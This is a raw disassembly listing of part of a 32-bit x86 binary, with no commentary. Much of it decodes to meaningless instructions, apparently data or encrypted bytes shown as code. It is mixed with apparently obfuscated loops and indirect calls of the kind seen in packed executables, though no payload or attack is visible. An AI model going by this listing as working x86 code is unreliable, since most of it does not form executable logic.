  408347:	comiss xmm0,DWORD PTR [edi-0x53289891]
  40834e:	or     ch,BYTE PTR [ebx-0x391081d0]
  408354:	out    dx,eax
  408355:	mov    ebp,0x6c244e72
  40835a:	fucomp st(0)
  40835c:	arpl   WORD PTR [esi+ebp*4-0x3b5ff91e],cx
  408363:	pushf  
  408364:	fld    TBYTE PTR [ecx+0x618715a8]
  40836a:	add    BYTE PTR [ecx+0x228d2053],cl
  408370:	lods   eax,DWORD PTR ds:[esi]
  408371:	cmp    BYTE PTR [eax],dh
  408373:	cmp    eax,0x5c7f78b9
  408378:	adc    al,0x78
  40837a:	adc    BYTE PTR [ebp+0x3b54fe9b],al
  408380:	mov    bh,0x44
  408382:	cmp    al,0xd1
  408384:	je     0x4083f5
  408386:	nop
  408387:	jne    0x4083d8
  408389:	sahf   
  40838a:	jb     0x4083a4
  40838c:	and    DWORD PTR [esi],eax
  40838e:	or     ah,BYTE PTR [ebx-0x7abcc32e]
  408394:	jle    0x4083dd
  408396:	lea    edi,[ebp-0x646b5f16]
  40839c:	jb     0x408373
  40839e:	mov    ecx,0x38573936
  4083a3:	fnsave [edx+0x18]
  4083a6:	ret    0xd2c9
  4083a9:	cmc    
  4083aa:	push   ds
  4083ab:	jae    0x408374
  4083ad:	sti    
  4083ae:	jmp    0x408427
  4083b0:	mov    al,ds:0x29d11025
  4083b5:	sub    al,0xa3
  4083b7:	aas    
  4083b8:	retf   
  4083b9:	sub    BYTE PTR [edi],dl
  4083bb:	sub    eax,0x802312ea
  4083c0:	sbb    al,0xcf
  4083c2:	fs (bad) 
  4083c4:	mov    eax,ds:0x36a7c630
  4083c9:	cs mov edi,0xf8667bf9
  4083cf:	js     0x40840b
  4083d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083d2:	pop    ecx
  4083d3:	sbb    cl,BYTE PTR [ecx+ebp*1-0xd95be9e]
  4083da:	mov    dh,0x8c
  4083dc:	push   ss
  4083dd:	cmc    
  4083de:	rol    dl,0xad
  4083e1:	pop    ss
  4083e2:	setns  BYTE PTR [edi]
  4083e5:	and    eax,DWORD PTR [edx+0x6d]
  4083e8:	and    bl,BYTE PTR [ecx+0x41]
  4083eb:	xchg   ebp,eax
  4083ec:	rcl    edx,1
  4083ee:	jno    0x4083ae
  4083f0:	loope  0x408427
  4083f2:	cs enter 0x8b3a,0x8d
  4083f7:	jo     0x4083f6
  4083f9:	lea    ecx,[edx]
  4083fb:	jecxz  0x4083f7
  4083fd:	cld    
  4083fe:	fsubrp st(3),st
  408400:	inc    eax
  408401:	jle    0x408404
  408403:	pop    es
  408404:	push   eax
  408405:	lds    esi,FWORD PTR ds:0x8f705f3
  40840b:	lea    esp,[edx-0x164dec37]
  408411:	in     eax,dx
  408412:	cmp    eax,esp
  408414:	dec    ebp
  408415:	cli    
  408416:	lock sahf 
  408418:	sbb    BYTE PTR [esi+0x36e3a2d6],0xed
  40841f:	mov    bl,0xc
  408421:	jns    0x408486
  408423:	cld    
  408424:	in     eax,0x58
  408426:	test   eax,0x19340f10
  40842b:	add    esp,DWORD PTR ds:0xa15c6430
  408431:	repz mov edi,0x1257db42
  408437:	test   eax,0x61b81099
  40843c:	ficom  WORD PTR [edx+ebp*8+0x61]
  408440:	push   edi
  408441:	sub    edi,edx
  408443:	mov    edx,0xee1d3331
  408448:	or     al,0xd6
  40844a:	int    0x53
  40844c:	dec    esp
  40844d:	aad    0x2d
  40844f:	push   0x65
  408451:	pop    edx
  408452:	adc    DWORD PTR [esi+0x64],edi
  408455:	lods   eax,DWORD PTR ds:[esi]
  408456:	or     DWORD PTR [edx-0x75100e95],0xffffffdb
  40845d:	fadd   QWORD PTR [eax-0x7f]
  408460:	mov    eax,ds:0xd52bcc2d
  408465:	add    al,0x97
  408467:	popa   
  408468:	and    al,0x3e
  40846a:	sub    ebx,esp
  40846c:	jmp    0x59624b1a
  408471:	out    dx,al
  408472:	mov    edx,0x69fb0d2
  408477:	fst    st(7)
  408479:	or     esp,DWORD PTR [edi]
  40847b:	push   0xd17e30e5
  408480:	lods   eax,DWORD PTR ds:[esi]
  408481:	or     eax,0x69820f09
  408486:	sbb    BYTE PTR [eax],al
  408488:	add    BYTE PTR [ebx-0x207e27ab],cl
  40848e:	lds    edx,FWORD PTR [esi+0x0]
  408491:	add    BYTE PTR [ebx+0x1d33fc7d],cl
  408497:	(bad)  
  408498:	sub    eax,0xd0330043
  40849d:	and    DWORD PTR ds:0x434411,0x0
  4084a7:	jmp    0x4084bb
  4084ac:	xor    ebx,ebx
  4084ae:	xor    ebx,DWORD PTR ds:0x434411
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434411,ebx
  4084bb:	cmp    DWORD PTR ds:0x434411,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434411,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432c42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43441d
  4084ed:	add    DWORD PTR ds:0x432dca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434366,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43442d
  408507:	or     DWORD PTR ds:0x434419,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434425,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4326fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4326fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4326fc,edx
  408540:	cmp    DWORD PTR ds:0x4326fc,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x4326fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4329d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432dc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	mov    al,0xc9
  408585:	adc    BYTE PTR [ecx],al
  408587:	test   al,0xd4
  408589:	jo     0x4085fb
  40858b:	imul   edi,DWORD PTR [edi+0x70],0xa518f670
  408592:	jns    0x408602
  408594:	cmp    DWORD PTR [ebx+0x4c7397c8],ebx
  40859a:	fwait
  40859b:	(bad)  
  40859c:	fcmovbe st,st(4)
  40859e:	sahf   
  40859f:	dec    edx
  4085a0:	sub    ah,BYTE PTR [esi]
  4085a2:	or     al,0x2
  4085a4:	inc    esp
  4085a5:	and    DWORD PTR [ebx-0x20c159cc],ecx
  4085ab:	sbb    eax,0x53d018bc
  4085b0:	retf   
  4085b1:	push   es
  4085b2:	jo     0x408601
  4085b4:	push   ecx
  4085b5:	pop    eax
  4085b6:	sub    eax,0x9b5da971
  4085bb:	sub    dl,0x4c
  4085be:	or     BYTE PTR [edx],ch
  4085c0:	jne    0x40858e
  4085c2:	std    
  4085c3:	mov    edx,0xfcb9fe84
  4085c8:	fwait
  4085c9:	push   ebx
  4085ca:	pop    ds
  4085cb:	pmulhw mm6,mm2
  4085ce:	add    al,0xce
  4085d0:	adc    DWORD PTR [edi-0x537c8309],esi
  4085d6:	inc    edi
  4085d7:	sub    al,0xd9
  4085d9:	add    ah,BYTE PTR [esi+ebp*8-0x33]
  4085dd:	addr16 mov eax,ds:0x6ec
  4085e1:	mov    ecx,0xad0cb240
  4085e6:	sbb    BYTE PTR [eax+ebp*1+0x61],dh
  4085ea:	inc    ebx
  4085eb:	and    esi,edx
  4085ed:	pusha  
  4085ee:	dec    ebx
  4085ef:	bound  edx,QWORD PTR [edi-0x59e7d5e5]
  4085f5:	shl    BYTE PTR [esi+ebp*8],0x4
  4085f9:	(bad)  
  4085fb:	mov    ebx,0xa9892876
  408600:	sbb    BYTE PTR [edx-0x1a],0xc8
  408604:	cmc    
  408605:	sar    BYTE PTR [edi],cl
  408607:	jmp    0x408673
  408609:	div    esi
  40860b:	ss sub al,0xc0
  40860e:	imul   edi,ebp,0x6169267c
  408614:	dec    ecx
  408615:	sbb    BYTE PTR [esi+0x5f],0x4e
  408619:	dec    edi
  40861a:	sub    DWORD PTR [ebx+0x60],ecx
  40861d:	iret   
  40861e:	hlt    
  40861f:	inc    ebx
  408620:	cmc    
  408621:	sub    BYTE PTR [ecx],bl
  408623:	xor    al,0x44
  408625:	mov    ds:0x29a67c12,al
  40862a:	mov    al,0xd7
  40862c:	mov    ds:0x99791885,al
  408631:	jle    0x4085bc
  408633:	pop    es
  408634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408635:	rcl    BYTE PTR [eax+0x2f12477e],cl
  40863b:	ret    0x60ff
  40863e:	dec    esp
  40863f:	std    
  408640:	in     ax,dx
  408642:	sub    BYTE PTR [esi-0x7a200292],0x60
  408649:	adc    BYTE PTR [edx+ebx*4],0xd3
  40864d:	adc    eax,0xeced8398
  408652:	fbld   TBYTE PTR [edi-0x21]
  408655:	mov    esi,0x9240af2d
  40865a:	push   es
  40865b:	inc    esi
  40865c:	mov    eax,ds:0xd3b03886
  408661:	retf   
  408662:	adc    BYTE PTR [esp+esi*8-0x28],al
  408666:	sbb    al,0x3d
  408668:	xchg   edi,eax
  408669:	mov    al,0x12
  40866b:	shr    DWORD PTR [esi-0x43b22c95],0x17
  408672:	not    DWORD PTR ds:[ebp+0x2e260ee0]
  408679:	add    ecx,DWORD PTR [edx+ebp*4]
  40867c:	dec    eax
  40867d:	push   ecx
  40867e:	pop    edx
  40867f:	sub    DWORD PTR [ecx+0x5d03bc7e],0xba607905
  408689:	mov    bh,0xdd
  40868b:	mov    eax,0xe858b8ce
  408690:	mov    eax,ds:0xc825801f
  408695:	enter  0x2c79,0x33
  408699:	mov    esp,0xd482d847
  40869e:	jno    0x40866a
  4086a0:	lds    esp,FWORD PTR [esi]
  4086a2:	out    0x44,al
  4086a4:	std    
  4086a5:	xor    BYTE PTR [edx],bl
  4086a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086a8:	int    0x45
  4086aa:	fnsave [esi-0x2044aebc]
  4086b0:	scas   eax,DWORD PTR es:[edi]
  4086b1:	push   esi
  4086b2:	mov    al,ds:0x79bdebea
  4086b7:	out    0x94,al
  4086b9:	idiv   BYTE PTR [ecx+edi*2]
  4086bc:	retf   0xdf87
  4086bf:	(bad)  
  4086c0:	into   
  4086c1:	in     al,0x4b
  4086c3:	xor    dh,ch
  4086c5:	lock mov ds:0x4d5dc141,al
  4086cb:	cs jle 0x408726
  4086ce:	(bad)  
  4086d0:	cld    
  4086d1:	jge    0x408735
  4086d3:	stos   DWORD PTR es:[edi],eax
  4086d4:	pop    es
  4086d5:	sub    DWORD PTR [esi],0xd22c821e
  4086db:	rol    eax,1
  4086dd:	ja     0x4086bc
  4086df:	int3   
  4086e0:	add    dh,al
  4086e2:	dec    ecx
  4086e3:	lea    edx,[edx-0x41]
  4086e6:	pop    es
  4086e7:	int    0xfe
  4086e9:	push   ebx
  4086ea:	test   al,0x16
  4086ec:	pop    ecx
  4086ed:	std    
  4086ee:	xchg   ecx,eax
  4086ef:	call   0xb4c9:0x33d97381
  4086f6:	pop    ebp
  4086f7:	outs   dx,DWORD PTR ds:[esi]
  4086f8:	mov    al,0xc6
  4086fa:	mov    dh,0xe4
  4086fc:	jmp    0x40867f
  4086fe:	ins    BYTE PTR es:[edi],dx
  4086ff:	je     0x408761
  408701:	scas   al,BYTE PTR es:[edi]
  408702:	sub    eax,0x86537226
  408707:	mov    edx,0xe363d853
  40870c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40870d:	test   bh,ah
  40870f:	inc    ebp
  408710:	cld    
  408711:	out    0x3b,eax
  408713:	mov    bl,0xc8
  408715:	adc    DWORD PTR [edx+0x18d29030],0x34
  40871c:	popf   
  40871d:	rcl    BYTE PTR [ecx],0x36
  408720:	(bad)  
  408721:	sub    eax,0x95e5a5b
  408726:	out    dx,eax
  408727:	push   esp
  408728:	adc    eax,0xe9442949
  40872d:	test   eax,0x6e91d36e
  408732:	mov    esp,0xfcf3f42f
  408737:	call   0x9a7:0x98feeade
  40873e:	(bad)  
  40873f:	jge    0x40879e
  408741:	fisubr WORD PTR [ebx-0x25]
  408744:	cli    
  408745:	mov    ah,0x1c
  408747:	pop    eax
  408748:	mov    cl,0x78
  40874a:	icebp  
  40874b:	mov    ebx,0xeb703902
  408750:	jg     0x408734
  408752:	dec    ebx
  408753:	push   eax
  408754:	sahf   
  408755:	stos   BYTE PTR es:[edi],al
  408756:	inc    ebx
  408757:	add    eax,0x416ca75f
  40875c:	sbb    al,0x79
  40875e:	push   edx
  40875f:	xchg   ecx,eax
  408760:	stos   BYTE PTR es:[edi],al
  408761:	xchg   esp,eax
  408762:	mov    ah,0xb1
  408764:	stos   BYTE PTR es:[edi],al
  408765:	jl     0x40878d
  408767:	mov    bl,0xe3
  408769:	sub    eax,0xef271531
  40876e:	pop    ecx
  40876f:	ss mov ah,0x6c
  408772:	test   ebp,edi
  408774:	hlt    
  408775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408776:	xchg   ecx,eax
  408777:	out    0xd6,al
  408779:	mov    bl,0x1
  40877b:	inc    ebx
  40877c:	pop    ss
  40877d:	xchg   ecx,eax
  40877e:	ficomp DWORD PTR [ebx-0x5e]
  408781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408782:	sub    bl,BYTE PTR [esi+0x5c]
  408785:	stos   DWORD PTR es:[edi],eax
  408786:	mov    edx,DWORD PTR [ebp-0x4]
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43438a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43438a,0x43441d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434415
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43438e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434415,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434372,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432708,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434425,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432dd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43436a,0x13
  408823:	cmp    DWORD PTR ds:0x43436a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43436a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43287d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432cfa
  40884e:	cmp    DWORD PTR ds:0x43436a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43436a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43436a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43436a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43436a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx-0x2cd741b5]
  40892a:	icebp  
  40892b:	mov    eax,ds:0x697070d2
  408930:	jg     0x4089a2
  408932:	jo     0x4089ad
  408934:	jl     0x40897a
  408936:	xor    ebx,esi
  408938:	ins    BYTE PTR es:[edi],dx
  408939:	mov    dl,0x83
  40893b:	es cdq 
  40893d:	adc    BYTE PTR [eax],dh
  40893f:	in     al,0x9a
  408941:	xchg   edi,eax
  408942:	pop    ecx
  408943:	in     al,0x4d
  408945:	js     0x4088e2
  408947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408948:	and    ch,bl
  40894a:	rol    BYTE PTR ds:0xe1899b9f,cl
  408950:	mov    ch,0x37
  408952:	jnp    0x40897a
  408954:	call   0xdea7a971
  408959:	mov    al,0x44
  40895b:	mov    al,ds:0x83f3c1f2
  408960:	retf   0xe945
  408963:	pop    ss
  408964:	xchg   edi,eax
  408965:	lods   al,BYTE PTR cs:[esi]
  408967:	sbb    al,0xb6
  408969:	jmp    0x1c08:0x5f0f6bcb
  408970:	(bad)  
  408971:	leave  
  408972:	(bad)  
  408973:	arpl   WORD PTR [edx+ebp*4],di
  408976:	xrelease mov BYTE PTR [ebx-0x2c6bb7da],dl
  40897d:	dec    DWORD PTR [edx]
  40897f:	inc    edi
  408980:	pop    esi
  408981:	jl     0x408975
  408983:	add    BYTE PTR [edi+esi*4],ah
  408986:	push   ss
  408987:	mov    ah,0xd6
  408989:	cs scas al,BYTE PTR es:[edi]
  40898b:	jp     0x4089d2
  40898d:	cs ja  0x408962
  408990:	push   edx
  408991:	lods   al,BYTE PTR ds:[esi]
  408992:	mov    esi,0xdd865cdf
  408997:	or     BYTE PTR [edi+0x57f41ca8],dl
  40899d:	aam    0x31
  40899f:	cmp    bh,bl
  4089a1:	scas   eax,DWORD PTR es:[edi]
  4089a2:	lods   eax,DWORD PTR ds:[esi]
  4089a3:	mov    ds:0x17c04a4e,al
  4089a8:	bound  esi,QWORD PTR [eax]
  4089aa:	sub    BYTE PTR [ebp-0x47f73945],cl
  4089b0:	sub    DWORD PTR [edx],0x2c1d7541
  4089b6:	xchg   ebx,eax
  4089b7:	adc    al,BYTE PTR [ebp+0x5b1af56c]
  4089bd:	sar    ebx,1
  4089bf:	jnp    0x40895c
  4089c1:	scas   eax,DWORD PTR es:[edi]
  4089c2:	mov    DWORD PTR gs:[ebp+0x28],0x74d2b718
  4089ca:	mov    fs,edx
  4089cc:	stos   BYTE PTR es:[edi],al
  4089cd:	rcr    BYTE PTR [ecx],1
  4089cf:	(bad)  
  4089d0:	retf   0x3e1
  4089d3:	ret    
  4089d4:	cld    
  4089d5:	les    ecx,FWORD PTR [ecx-0x76]
  4089d8:	sub    al,BYTE PTR [edx+0x5a]
  4089db:	rcr    bh,cl
  4089dd:	xchg   BYTE PTR [edx+0x1d],bl
  4089e0:	mov    edi,0x4e53cfe
  4089e5:	pop    esi
  4089e6:	mov    WORD PTR [edi+0x7],ds
  4089e9:	sub    ah,bh
  4089eb:	jns    0x408982
  4089ed:	cmp    BYTE PTR ds:0x1b222ad4,ch
  4089f3:	jbe    0x408a42
  4089f5:	test   esp,edx
  4089f7:	push   ds
  4089f8:	sahf   
  4089f9:	and    al,0x21
  4089fb:	jb     0x4089d9
  4089fd:	mov    ecx,0xf870ef39
  408a02:	mov    bl,0x79
  408a04:	sbb    ecx,DWORD PTR [ecx]
  408a06:	push   ebp
  408a07:	cwde   
  408a08:	lahf   
  408a09:	loope  0x40898b
  408a0b:	cwde   
  408a0c:	jb     0x408992
  408a0e:	push   0x6d
  408a10:	pusha  
  408a11:	(bad)  
  408a12:	jne    0x408a76
  408a14:	push   esp
  408a15:	jnp    0x4089a8
  408a17:	mov    gs,edi
  408a19:	addr16 pop edi
  408a1b:	mov    esp,0x31bb06f7
  408a20:	sub    edi,DWORD PTR [edx+0x1c82cf7a]
  408a26:	push   edi
  408a27:	or     esi,DWORD PTR [esi]
  408a29:	ins    DWORD PTR es:[edi],dx
  408a2a:	in     al,dx
  408a2b:	add    cl,BYTE PTR [eax+ebp*8]
  408a2e:	jmp    0x19ab:0xad4447d5
  408a35:	das    
  408a36:	test   al,0x28
  408a38:	push   ds
  408a39:	mov    edx,0x939902ec
  408a3e:	and    dl,BYTE PTR [edx-0x2a]
  408a41:	(bad)  
  408a42:	dec    edi
  408a43:	add    eax,0x65823420
  408a48:	mov    ebx,0x4190bde6
  408a4d:	rep outs dx,BYTE PTR ds:[esi]
  408a4f:	ja     0x408a2d
  408a51:	fwait
  408a52:	dec    edx
  408a53:	mov    al,0x75
  408a55:	into   
  408a56:	shl    bl,1
  408a58:	rcl    DWORD PTR [ebx+edx*1-0x71],0x66
  408a5d:	push   esp
  408a5e:	mov    ss,WORD PTR [edx+ebx*1+0x5fecc8a9]
  408a65:	mov    ch,0x49
  408a67:	and    DWORD PTR [ebx+0x3ee89507],eax
  408a6d:	mov    edi,0x61ddea6
  408a72:	mov    dl,0xcd
  408a74:	out    0xdc,eax
  408a76:	jno    0x60082953
  408a7c:	jecxz  0x408a11
  408a7e:	(bad)  
  408a7f:	in     al,0x7b
  408a81:	cmp    edx,DWORD PTR ds:[ebx-0x64a3a0eb]
  408a88:	scas   al,BYTE PTR es:[edi]
  408a89:	dec    BYTE PTR [edx]
  408a8b:	cli    
  408a8c:	xchg   ecx,eax
  408a8d:	adc    DWORD PTR cs:[ebp-0x190ffb5a],esi
  408a94:	push   ss
  408a95:	jmp    DWORD PTR [bp+di-0x2]
  408a99:	iret   
  408a9a:	aam    0xcb
  408a9c:	inc    edx
  408a9d:	cmp    ecx,DWORD PTR [ecx+0x2719b3c7]
  408aa3:	jns    0x408a5f
  408aa5:	adc    cl,ah
  408aa7:	outs   dx,BYTE PTR ds:[esi]
  408aa8:	es sti 
  408aaa:	ja     0x408ae5
  408aac:	cmp    BYTE PTR [edx+ecx*8],al
  408aaf:	(bad)  
  408ab0:	jl     0x408ab4
  408ab2:	out    0xb,al
  408ab4:	push   0x60
  408ab6:	(bad)  
  408ab8:	push   ss
  408ab9:	repz loopne 0x408ab5
  408abc:	xchg   edx,eax
  408abd:	in     al,0xa2
  408abf:	ins    BYTE PTR es:[edi],dx
  408ac0:	in     eax,dx
  408ac1:	push   es
  408ac2:	loopne 0x408a9e
  408ac4:	in     al,dx
  408ac5:	lahf   
  408ac6:	mov    ds:0xa808c24b,eax
  408acb:	jae    0x408aef
  408acd:	mov    cl,0x54
  408acf:	xchg   edx,eax
  408ad0:	lahf   
  408ad1:	stos   DWORD PTR es:[edi],eax
  408ad2:	fisub  DWORD PTR [ecx]
  408ad4:	jnp    0x408b43
  408ad6:	mov    ds:0x844511e8,al
  408adb:	pop    ss
  408adc:	add    ecx,esp
  408ade:	mov    WORD PTR [ebp+0x24aa68d5],ds
  408ae4:	mov    al,ds:0xab34ad33
  408ae9:	jo     0x408b3b
  408aeb:	pop    ecx
  408aec:	ss and dl,cl
  408aef:	fadd   DWORD PTR [ecx+0x4f6c4d03]
  408af5:	fld    DWORD PTR [ecx-0x4a]
  408af8:	jmp    0xa98b420b
  408afd:	mov    edx,DWORD PTR [ecx]
  408aff:	xor    bl,BYTE PTR [esi+0x2f]
  408b02:	test   esp,edi
  408b04:	mov    ds:0x730c1463,eax
  408b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b0a:	cmc    
  408b0b:	imul   ebx,DWORD PTR [esi+0x2064abcb],0x6aa5c44a
  408b15:	aas    
  408b16:	and    esi,esp
  408b18:	sbb    eax,0x889a52ff
  408b1d:	rol    dh,1
  408b1f:	lods   eax,DWORD PTR ds:[esi]
  408b20:	pop    ebx
  408b21:	test   BYTE PTR [edi],0x85
  408b24:	add    BYTE PTR [eax+0x57480b6c],dh
  408b2a:	mov    edi,DWORD PTR [ebp-0x4]
  408b2d:	xor    edi,eax
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	int    0x11
  408b93:	xchg   edx,eax
  408b94:	dec    ecx
  408b95:	call   0x707f:0x697070d0
  408b9c:	jo     0x408be1
  408b9e:	add    DWORD PTR [esi],esp
  408ba0:	mov    cl,0x4a
  408ba2:	in     al,dx
  408ba3:	fisttp DWORD PTR [edi-0x1f]
  408ba6:	mov    ebp,0xd5a30a8a
  408bab:	mov    edi,0x376f9d86
  408bb0:	int    0xf2
  408bb2:	mov    ch,0x2d
  408bb4:	add    al,0xe5
  408bb6:	mov    al,ds:0x6ba4db22
  408bbb:	in     eax,0x1
  408bbd:	pop    eax
  408bbe:	xchg   ebp,eax
  408bbf:	xor    al,0x33
  408bc1:	jle    0x408beb
  408bc3:	test   bl,dh
  408bc5:	fnstsw WORD PTR [ebx-0x354965a9]
  408bcb:	add    al,0x6d
  408bcd:	xor    esp,0x60
  408bd0:	add    bh,dl
  408bd2:	inc    eax
  408bd3:	or     al,0x19
  408bd5:	test   eax,0x10089e29
  408bda:	push   ss
  408bdb:	sahf   
  408bdc:	es iret 
  408bde:	bound  esi,QWORD PTR ds:0xa0555c27
  408be4:	sahf   
  408be5:	sbb    ebp,edx
  408be7:	fiadd  DWORD PTR [edi+ecx*1-0x6886c0d2]
  408bee:	fisttp QWORD PTR [ebx-0x59]
  408bf1:	push   esp
  408bf2:	iret   
  408bf3:	(bad)  [edi-0x7d]
  408bf6:	call   0xe5a0:0x4d862cbb
  408bfd:	push   es
  408bfe:	out    0xa6,eax
  408c00:	cmp    BYTE PTR [ebx-0x54c97f72],cl
  408c06:	lods   eax,DWORD PTR ds:[esi]
  408c07:	(bad)  
  408c08:	jo     0x408bbf
  408c0a:	pop    ebp
  408c0b:	xchg   ebx,eax
  408c0c:	stc    
  408c0d:	outs   dx,BYTE PTR ds:[esi]
  408c0e:	mov    dh,0x97
